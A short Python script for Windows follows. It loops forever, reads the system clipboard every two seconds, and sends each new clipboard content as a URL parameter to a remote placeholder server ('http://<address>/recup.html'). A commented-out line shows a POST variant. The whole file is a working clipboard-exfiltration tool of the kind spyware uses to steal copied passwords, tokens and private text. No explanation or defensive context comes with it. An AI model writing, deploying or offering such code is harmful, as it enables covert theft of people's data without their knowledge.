import win32clipboard,time,requests
lastBoard = str()
while True:
    win32clipboard.OpenClipboard()
    board = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    if board != lastBoard:
        print board
#        requests.post(url= 'http://<address>/recup.html', data ={'clip':board} )
        requests.get(url= 'http://<address>/recup.html',params = {'args':board})
        lastBoard = str(board)
    time.sleep(2)
